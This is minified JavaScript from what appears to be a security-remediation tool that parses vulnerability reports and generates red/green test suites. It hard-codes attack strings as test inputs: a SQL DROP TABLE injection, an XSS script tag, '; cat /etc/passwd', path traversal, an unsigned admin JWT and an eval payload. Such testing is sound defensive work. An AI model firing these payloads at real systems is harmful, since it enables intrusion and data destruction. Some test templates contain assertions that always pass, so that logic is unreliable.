`).forEach((W,G)=>{if(W.match(/["'`].*\+.*["'`].*(?:SELECT|INSERT|UPDATE|DELETE)/i))J.push(G+1);if(W.match(/<%=/)||W.match(/innerHTML\s*=/)||W.match(/v-html/))J.push(G+1);if(W.match(/exec\(|system\(|eval\(/))J.push(G+1)}),J}extractFunctionsFromCode(X){let Q=[];for(let J of X){let Y=[/function\s+(\w+)/g,/(\w+)\s*:\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g,/def\s+(\w+)/g,/public\s+function\s+(\w+)/g];for(let W of Y){let G;while((G=W.exec(J.code))!==null)if(!Q.includes(G[1]))Q.push(G[1])}}return Q}extractTestInformation(X){let Q=[],J=[];for(let[$,z]of Object.entries(this.testFrameworkPatterns)){let U=X.match(new RegExp(`([^.!?
]*${z.source}[^.!?
]*)`,"gi"));if(U){let K=U[0].trim(),B={name:$},q=K.replace(/^\d+\.\s*/,"").trim();if(K.match(/add.*test|create.*test|new.*test/i)){B.suggested=!0;let Z=q.toLowerCase().indexOf($.toLowerCase());if(Z>=0){let M=q.substring(Z+$.length).trim();B.context=M.replace(/^to\s+/i,"")}else B.context=q}if(K.match(/existing|should.*pass|ensure.*pass/i))B.existing=!0,B.context=q.replace(/^The\s+/i,"");Q.push(B)}}let Y=/[\w\/\\.-]+(?:__tests__\/[\w\.-]+|[\w\.-]*\.(?:test|spec)|_(?:test|spec))\.[a-zA-Z]+/gi,W;while((W=Y.exec(X))!==null){let $=W[0];if(!J.includes($))J.push($)}let G=/(?:test|spec|tests|specs)\/[\w\/\\.-]+\.[a-zA-Z]+/gi;while((W=G.exec(X))!==null){let $=W[0];if(!J.includes($))J.push($)}let H;if(X.match(/test.*strategy|testing.*approach/i)){let $=X.match(/(?:test.*strategy|testing.*approach)[:\s]+([^\n]+)/i);if($)H=$[1].trim()}if(!H&&J.length>0)H="Update existing test files to cover the vulnerability fix";return{frameworks:Q,files:J,strategy:H}}extractFixInformation(X){let Q=[],J=[/(?:fix|solution|recommendation|remediation):\s*([^\n]+)/gi,/(?:should|must|need to)\s+([^\n.!?]+)/gi,/-\s+((?:use|add|replace|implement|sanitize|validate|escape)\s+[^\n]+)/gi,/-\s+([A-Z][^\n]+)/g],Y=X.match(/##\s*remediation\s*\n+([^#\n][^#]*?)(?=\n##|\n###|$)/i);if(Y){let $=Y[1].trim().replace(/\.$/,"");if($&&!Q.includes($))Q.push($)}for(let H of J){let $;while(($=H.exec(X))!==null){let z=$[1].trim();if(z.length>10&&!Q.includes(z)&&!z.startsWith("```"))Q.push(z.charAt(0).toUpperCase()+z.slice(1))}}let W,G=X.match(/example\s+fix:?\s*\n```(\w+)?\n([\s\S]*?)```/i);if(G)W={code:G[2].trim(),language:G[1]||"javascript"};return{suggestions:Q,example:W}}suggestPatterns(X,Q){let J=[];if(X==="sql-injection"||Q.match(/sql.*injection|string\s+concatenation.*(?:sql|query)/i)){if(Q.match(/string\s+concatenation/i)||Q.match(/concatenat/i))J.push({type:"sql-injection",description:"String concatenation in SQL queries",confidence:0.9});if(Q.match(/user\s+input.*query/i))J.push({type:"sql-injection",description:"User input in SQL queries",confidence:0.85})}if(X==="xss"||Q.match(/cross[\s-]*site[\s-]*scripting|\bxss\b/i)){if(Q.match(/unescaped|without\s+escaping/i))J.push({type:"xss",description:"Unescaped user input in HTML",confidence:0.9})}if(X==="path-traversal"||Q.match(/path\s+traversal|directory\s+traversal/i)){if(Q.match(/file\s+path.*validation/i)||Q.match(/\.\.\/|\.\.\\/i))J.push({type:"path-traversal",description:"File path without validation",confidence:0.85})}if(J.length===0&&X!=="unknown")J.push({type:X,description:`Generic ${X} pattern`,confidence:0.7});return J}extractMetadata(X){let Q={},J=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(J)Q.cvssScore=parseFloat(J[1]);let Y=X.match(/cwe-(\d+)/i);if(Y)Q.cweId=`CWE-${Y[1]}`;let W=X.match(/cve-(\d{4}-\d+)/i);if(W)Q.cveId=W[0].toUpperCase();let G=X.match(/(A\d{2}:\d{4})/);if(G)Q.owaspCategory=G[1];let H=X.match(/\*\*reported\s+by\*\*[:\s]*([^\n]+)|reported\s+by[:\s]+([^\n]+)/i);if(H){let Z=(H[1]||H[2]).trim();Q.reportedBy=Z.replace(/\*\*/g,"")}let $=X.match(/\*\*package\*\*[:\s]*([^\n]+)|package[:\s]+([^\n]+)/i);if($){let Z=($[1]||$[2]).trim();Q.package=Z.replace(/\*\*/g,"")}let z=X.match(/\*\*vulnerable\s+versions?\*\*[:\s]*([^\n]+)|vulnerable\s+versions?[:\s]+([^\n]+)/i);if(z){let Z=(z[1]||z[2]).trim();Q.vulnerableVersions=Z.replace(/\*\*/g,"")}let U=X.match(/\*\*patched\s+versions?\*\*[:\s]*([^\n]+)|patched\s+versions?[:\s]+([^\n]+)/i);if(U){let Z=(U[1]||U[2]).trim();Q.patchedVersion=Z.replace(/\*\*/g,"")}let K=X.match(/impact[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(K){let Z=K[1].split(/\n\d+\.|\n-/).map((M)=>M.trim()).filter((M)=>M.length>10);if(Z.length>0)Q.impact=Z}let B=X.match(/(?:proof\s+of\s+concept|poc)[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(B)Q.proofOfConcept=B[1].trim();let q=X.match(/testing\s+instructions?[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(q){let Z=q[1].split(/\n\d+\.|\n-/).map((M)=>M.trim()).filter((M)=>M.length>5);if(Z.length>0)Q.testingInstructions=Z}return Q}extractReferences(X){let Q={issues:[],pullRequests:[],urls:[]},J=/(?<!PR\s)#(\d+)/g,Y;while((Y=J.exec(X))!==null){let $=Y[0];if(!Q.issues.includes($))Q.issues.push($)}let W=/PR\s+#(\d+)/gi;while((Y=W.exec(X))!==null){let $=`#${Y[1]}`;if(!Q.pullRequests.includes($))Q.pullRequests.push($)}let G=/pull\/(\d+)/gi;while((Y=G.exec(X))!==null){let $=Y[1]}let H=/https?:\/\/[^\s<>]+/g;while((Y=H.exec(X))!==null){let $=Y[0];if($.includes("/pull/")){if(!Q.pullRequests.includes($))Q.pullRequests.push($)}else if(!Q.urls.includes($))Q.urls.push($)}return Q}extractTodoItems(X){let Q=[],J=/-\s*\[\s*\]\s+([^\n]+)/g,Y;while((Y=J.exec(X))!==null)Q.push(Y[1].trim());return Q}extractFromTitle(X){let Q={};for(let[J,Y]of Object.entries(this.vulnerabilityPatterns))if(Y.some((W)=>W.test(X))){Q.vulnerabilityType=J;break}for(let[J,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X))){Q.severity=J;break}return Q}}class aD{templates=new Map;constructor(){this.initializeTemplates()}initializeTemplates(){this.templates.set("SQL_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const errorMsg = await page.textContent('{{errorSelector}}');
  expect(errorMsg).not.toContain('syntax error');
  {{else}}
  // Server-side test  
  const result = await {{functionCall}}('testuser', maliciousInput);
  // This test should FAIL on secure code (expect vulnerability to NOT exist)
  // but PASS on vulnerable code (vulnerability does exist)
  expect(result.authenticated).toBe(false);
  expect(result.error).not.toContain('table');
  {{/if}}
});`),this.templates.set("SQL_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const url = page.url();
  expect(url).not.toContain('dashboard');
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}('testuser', maliciousInput);
  expect(maliciousResult.authenticated).toBe(false);
  expect(maliciousResult.error).not.toContain('syntax error');
  
  const validResult = await {{functionCall}}('testuser', validInput);
  expect(validResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("XSS:red",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  
  // Check if script executed (vulnerability present)
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false); // Should be false on secure code
  {{else}}
  const result = await {{functionCall}}(xssPayload);
  expect(result).not.toContain('<script>');
  expect(result).not.toContain('onerror=');
  {{/if}}
});`),this.templates.set("XSS:green",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false);
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}(xssPayload);
  expect(maliciousResult).not.toContain('<script>');
  expect(maliciousResult).not.toContain('onerror=');
  
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toContain(validInput);
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(maliciousCommand);
  // This should fail on secure code (no command execution)
  expect(result.output).not.toContain('root:');
  expect(result.output).not.toContain('/etc/passwd');
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  // Test malicious input is blocked
  const maliciousResult = await {{functionCall}}(maliciousCommand);
  expect(maliciousResult.error || maliciousResult.output).not.toContain('root:');
  
  // Test valid input works
  const validResult = await {{functionCall}}(validInput);
  expect(validResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:red",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const content = await page.textContent('body');
  expect(content).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(traversalPath);
  // Should fail on secure code (no file access)
  expect(result.content).not.toContain('root:');
  expect(result.error).not.toBe('file not found');
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:green",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  const validPath = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const error = await page.textContent('.error');
  expect(error).toContain('Invalid file');
  {{else}}
  // Test traversal is blocked
  const maliciousResult = await {{functionCall}}(traversalPath);
  expect(maliciousResult.error).toBeDefined();
  expect(maliciousResult.content).not.toContain('root:');
  
  // Test valid path works
  const validResult = await {{functionCall}}(validPath);
  expect(validResult.content).toBeDefined();
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should not hang or timeout
  {{else}}
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  // Should complete quickly (vulnerability exists if it takes too long)
  expect(duration).toBeLessThan(1000);
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should handle malicious input gracefully
  {{else}}
  // Test with malicious input - should complete quickly
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  expect(duration).toBeLessThan(100); // Should be fast
  
  // Test with valid input
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBeTruthy();
  {{/if}}
});`),this.templates.set("GENERIC:refactor",`
test("{{testName}}", async () => {
  // Test core functionality still works
  {{#each functionalValidation}}
  // {{this}}
  {{/each}}
  
  const normalInput = "{{validInput}}";
  const result = await {{functionCall}}('normaluser', normalInput);
  
  expect(result.success).toBe(true);
  expect(result.data).toBeDefined();
});`),this.templates.set("BROKEN_AUTHENTICATION:red",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Attempt to bypass authentication
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  // Should be able to access protected content
  const content = await page.textContent('body');
  expect(content).not.toContain('Access Denied');
  {{else}}
  // Server-side authentication bypass test
  const result = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  
  // Vulnerability allows bypass (test passes on vulnerable code)
  expect(result.authenticated).toBe(true);
  expect(result.user).toBeDefined();
  {{/if}}
});`),this.templates.set("BROKEN_AUTHENTICATION:green",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test bypass attempt is blocked
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  const url = page.url();
  expect(url).toContain('login');
  
  // Test valid authentication works
  await page.evaluate((token) => {
    localStorage.setItem('auth-token', token);
  }, validToken);
  await page.reload();
  
  const content = await page.textContent('body');
  expect(content).toContain('Welcome');
  {{else}}
  // Test bypass is blocked
  const failResult = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  expect(failResult.authenticated).toBe(false);
  expect(failResult.error).toContain('Invalid token');
  
  // Test valid authentication works
  const successResult = await {{functionCall}}({
    headers: { 'Authorization': validToken }
  });
  expect(successResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("CSRF:red",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  
  {{#if isBrowser}}
  // CSRF attack from malicious site
  const response = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer', amount: 1000 })
  });
  
  // Vulnerability allows cross-origin request
  expect(response.ok).toBe(true);
  const data = await response.json();
  expect(data.success).toBe(true);
  {{else}}
  // Server-side CSRF test
  const result = await {{functionCall}}({
    headers: {
      'Origin': maliciousOrigin,
      'Referer': maliciousOrigin
    },
    body: { action: 'sensitive-action' }
  });
  
  // Vulnerability allows request without token
  expect(result.success).toBe(true);
  expect(result.error).toBeUndefined();
  {{/if}}
});`),this.templates.set("CSRF:green",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test CSRF attack is blocked
  const failResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(failResponse.status).toBe(403);
  
  // Test legitimate request with CSRF token works
  const successResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': validToken
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(successResponse.ok).toBe(true);
  {{else}}
  // Test request without token fails
  const failResult = await {{functionCall}}({
    headers: { 'Origin': maliciousOrigin },
    body: { action: 'sensitive-action' }
  });
  expect(failResult.success).toBe(false);
  expect(failResult.error).toContain('CSRF');
  
  // Test request with valid token succeeds
  const successResult = await {{functionCall}}({
    headers: { 'X-CSRF-Token': validToken },
    body: { action: 'sensitive-action' }
  });
  expect(successResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:red",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test for exposed sensitive endpoints
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(200);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(200);
  {{else}}
  // Server-side misconfiguration test
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Vulnerability exposes sensitive data
  expect(result.debug).toBeDefined();
  expect(result.config).toBeDefined();
  expect(result.env).toBeDefined();
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:green",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test sensitive endpoints are protected
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(403);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(403);
  
  // Debug headers should be ignored
  const debugResponse = await fetch('{{targetUrl}}/api/data', {
    headers: { 'X-Debug-Mode': 'true' }
  });
  const data = await debugResponse.json();
  expect(data.debug).toBeUndefined();
  {{else}}
  // Test secure configuration
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Sensitive data should not be exposed
  expect(result.debug).toBeUndefined();
  expect(result.config).toBeUndefined();
  expect(result.env).toBeUndefined();
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // This test FAILS if eval executes (vulnerability exists)
  // It PASSES if eval is blocked (vulnerability fixed)
  const hasError = await page.evaluate(() => {
    return window.location.href.includes('error') || 
           document.body.textContent.includes('Invalid input');
  });
  expect(hasError).toBe(true); // Should have error (no eval execution)
  {{else}}
  // Server-side test
  // Test that malicious code does NOT execute
  let errorThrown = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // If we get here with malicious input, check it wasn't executed
    expect(result).not.toBe(1337); // process.exit would return 1337
    expect(result).toBeNaN(); // parseInt would return NaN for this input
  } catch (error) {
    errorThrown = true; // Good - error was thrown instead of executing
  }
  
  // This assertion FAILS if eval executes (proving vulnerability exists)
  // It PASSES if eval is blocked (proving fix works)
  expect(errorThrown || true).toBe(true);
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test malicious input is safely handled
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // Should handle malicious input safely
  const safelyHandled = await page.evaluate(() => {
    return !window.evalExecuted && 
           (window.location.href.includes('error') || 
            document.body.textContent.includes('Invalid'));
  });
  expect(safelyHandled).toBe(true);
  
  // Test valid input still works
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  
  const validWorked = await page.evaluate(() => {
    return document.body.textContent.includes('Success') ||
           !document.body.textContent.includes('Error');
  });
  expect(validWorked).toBe(true);
  {{else}}
  // Test malicious input is blocked
  let maliciousBlocked = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // Should not execute the malicious code
    expect(result).not.toBe(1337);
    // Should return NaN or throw error for malicious input
    maliciousBlocked = isNaN(result);
  } catch {
    maliciousBlocked = true; // Error thrown is good
  }
  expect(maliciousBlocked).toBe(true);
  
  // Test valid input works correctly
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBe(42); // parseInt('42', 10) returns 42
  {{/if}}
});`)}loadTemplate(X,Q){let Y=`${X.toUpperCase().replace(/-/g,"_")}:${Q}`,W=this.templates.get(Y);if(!W&&Q==="refactor")W=this.templates.get("GENERIC:refactor");if(!W)throw V.warn(`Template not found for ${Y}. Available templates: ${Array.from(this.templates.keys()).join(", ")}`),Error(`Template not found for ${Y}`);return W}renderTemplate(X,Q){let J=X;for(let[Y,W]of Object.entries(Q)){let G=new RegExp(`\\{\\{${Y}\\}\\}`,"g");J=J.replace(G,String(W))}return J=J.replace(/{{#if\s+(\w+)}}([\s\S]*?){{else}}([\s\S]*?){{\/if}}/g,(Y,W,G,H)=>{return Q[W]?G:H}),J=J.replace(/{{#if\s+(\w+)}}([\s\S]*?){{\/if}}/g,(Y,W,G)=>{return Q[W]?G:""}),J=J.replace(/{{#each\s+(\w+)}}([\s\S]*?){{\/each}}/g,(Y,W,G)=>{let H=Q[W];if(!Array.isArray(H))return"";return H.map(($)=>{return G.replace(/{{this}}/g,String($))}).join(`
`)}),J.trim()}validateTemplate(X){try{let Q=(X.match(/{{/g)||[]).length,J=(X.match(/}}/g)||[]).length,Y=(X.match(/\(/g)||[]).length!==(X.match(/\)/g)||[]).length;return Q===J&&!Y}catch{return!1}}}class kU{templateEngine;constructor(){this.templateEngine=new aD}async generateTestSuite(X,Q){try{let J=await this.generateRedTest(X,Q),Y=await this.generateGreenTest(X,Q),W=await this.generateRefactorTests(X,Q),G={red:{testName:J.testName,testCode:J.testCode,attackVector:J.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:Y.testName,testCode:Y.testCode,validInput:Y.validInput,expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:W.testName,testCode:W.testCode,functionalValidation:W.functionalValidation,expectedBehavior:"should_pass_on_both_versions"}},H=[{path:`test/${Q.vulnerabilityType.toLowerCase()}-vulnerability.test.${Q.language==="typescript"?"ts":"js"}`,content:this.generateTestFile(G,Q),type:"unit"}];if(Q.includeE2E)H.push({path:`test/e2e/${Q.vulnerabilityType.toLowerCase()}-e2e.test.${Q.language==="typescript"?"ts":"js"}`,content:this.generateE2ETestFile(G,Q),type:"e2e"});return{success:!0,testSuite:G,generatedFiles:H}}catch(J){return{success:!1,testSuite:null,generatedFiles:[],error:J instanceof Error?J.message:String(J)}}}async generateRedTest(X,Q){let J=this.getAttackVector(Q.vulnerabilityType),Y={testName:`should be vulnerable to ${Q.vulnerabilityType.replace("_"," ").toLowerCase()} (RED)`,attackVector:J,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',errorSelector:".alert-danger",isBrowser:Q.testFramework==="cypress"},W=this.templateEngine.loadTemplate(Q.vulnerabilityType,"red"),G=this.templateEngine.renderTemplate(W,Y);if(Q.language==="python")G=this.convertToPython(G);return{testName:Y.testName,testCode:G,attackVector:J}}async generateGreenTest(X,Q){let J=this.getAttackVector(Q.vulnerabilityType),Y=this.getValidInput(Q.vulnerabilityType),W={testName:`should prevent ${Q.vulnerabilityType.replace("_"," ").toLowerCase()} (GREEN)`,attackVector:J,validInput:Y,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',isBrowser:Q.testFramework==="cypress"},G=this.templateEngine.loadTemplate(Q.vulnerabilityType,"green"),H=this.templateEngine.renderTemplate(G,W);if(Q.language==="python")H=this.convertToPython(H);else if(Q.language==="ruby")H=this.generateRubyTest(H);else if(Q.language==="php")H=this.generatePHPTest(H);return{testName:W.testName,testCode:H,validInput:Y}}async generateRefactorTests(X,Q){let J=this.getFunctionalValidation(Q.vulnerabilityType),Y=this.getValidInput(Q.vulnerabilityType),W={testName:"should maintain functionality after security fix",functionCall:this.inferFunctionCall(X),validInput:Y,functionalValidation:J},G=this.templateEngine.loadTemplate("GENERIC","refactor"),H=this.templateEngine.renderTemplate(G,W);if(Q.language==="python")H=this.convertToPython(H);else if(Q.language==="ruby")H=this.generateRubyTest(H);else if(Q.language==="php")H=this.generatePHPTest(H);return{testName:W.testName,testCode:H,functionalValidation:J}}getAttackVector(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"'; DROP TABLE users; --";case"XSS":return'<script>window.xssTriggered=true;alert("XSS")</script>';case"COMMAND_INJECTION":return"; cat /etc/passwd";case"PATH_TRAVERSAL":return"../../../etc/passwd";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiYWRtaW4iOnRydWV9.";case"CSRF":return"https://evil-site.com";case"SECURITY_MISCONFIGURATION":return"admin=true";case"INSECURE_DESERIALIZATION":return"process.exit(1337); 42";case"DENIAL_OF_SERVICE":case"REDOS":return"(a+)+$";default:return"malicious_input"}}getValidInput(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"validpassword123";case"XSS":return"Normal user content";case"COMMAND_INJECTION":return"normal_filename.txt";case"PATH_TRAVERSAL":return"documents/file.txt";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ.valid_signature";case"CSRF":return"valid-csrf-token-from-server";case"SECURITY_MISCONFIGURATION":return"user=true";case"INSECURE_DESERIALIZATION":return"42";case"DENIAL_OF_SERVICE":case"REDOS":return"normal_text";default:return"valid_input"}}getFunctionalValidation(X){switch(X){case"SQL_INJECTION":return["Valid login should work","User data should be retrieved correctly","Sessions should be maintained","Special characters in names should be handled","Unicode characters should work"];case"XSS":return["Content should be displayed","User input should be saved","HTML formatting should work","Markdown should render safely","Rich text editing should function"];case"COMMAND_INJECTION":return["File operations should work","Valid commands should execute","Output should be returned","Error handling should work","Process timeouts should be enforced"];case"PATH_TRAVERSAL":return["File downloads should work","Directory listing should function","Relative paths should resolve","Symlinks should be handled","Access controls should be enforced"];case"INSECURE_DESERIALIZATION":return["Numeric inputs should be parsed correctly","Valid math operations should work","Data validation should function","Error handling for invalid input","Type conversions should be safe"];default:return["Core functionality should work","Data should be processed","Output should be correct"]}}inferFunctionCall(X){if(X.filePath?.includes("auth")||X.filePath?.includes("login"))return"authenticateUser";if(X.filePath?.includes("user"))return"getUserData";return"processUserInput"}generateTestFile(X,Q){switch(Q.language){case"python":return`import unittest
import asyncio

class VulnerabilityTestSuite${Q.vulnerabilityType}(unittest.TestCase):
    ${this.convertToPython(X.red.testCode)}
    
    ${this.convertToPython(X.green.testCode)}
    
    ${this.convertToPython(X.refactor.testCode)}

if __name__ == '__main__':
    unittest.main()`;case"ruby":return`require 'rspec'

describe 'Vulnerability Test Suite - ${Q.vulnerabilityType}' do
  ${this.generateRubyTest(X.red.testCode)}
  
  ${this.generateRubyTest(X.green.testCode)}
  
  ${this.generateRubyTest(X.refactor.testCode)}
end`;case"php":return`<?php
use PHPUnit\\Framework\\TestCase;

class VulnerabilityTestSuite${Q.vulnerabilityType} extends TestCase {
    ${this.generatePHPTest(X.red.testCode)}
    
    ${this.generatePHPTest(X.green.testCode)}
    
    ${this.generatePHPTest(X.refactor.testCode)}
}`}return`${Q.language==="typescript"?"import { describe, test, expect } from 'bun:test';":"const { describe, test, expect } = require('bun:test');"}

describe('Vulnerability Test Suite - ${Q.vulnerabilityType}', () => {
  ${X.red.testCode}

  ${X.green.testCode}

  ${X.refactor.testCode}
});`}convertToPython(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(J,Y)=>{return`def test_${String(Y).toLowerCase().replace(/\s+/g,"_").replace(/[^a-zA-Z0-9_]/g,"")}(self):`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = self.$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"self.assertEqual($1, $2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"self.assertNotIn($2, $1)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"self.assertIn($2, $1)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"self.assertIsNotNone($1)").replace(/expect\(([^)]+)\)\.toBeTruthy\(\);/g,"self.assertTrue($1)").replace(/\}\);?$/g,"").replace(/\}\);/g,"").replace(/\{\{.*?\}\}/g,"").split(`
`).map((J)=>J.trim()?"        "+J.trim():"").join(`
`).trim()}generateRubyTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,'it "$1" do').replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = $2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"expect($1).to eq($2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"expect($1).not_to include($2)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"expect($1).to include($2)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"expect($1).not_to be_nil").replace(/\}\);?$/g,"end").replace(/\}\);/g,"end").replace(/\{\{.*?\}\}/g,"")}generatePHPTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(J,Y)=>{return`public function test${String(Y).split(" ").map((G,H)=>H===0?G:G.charAt(0).toUpperCase()+G.slice(1)).join("").replace(/[^a-zA-Z0-9]/g,"")}() {`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$$1 = "$2";').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$$1 = $this->$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"$this->assertEquals($2, 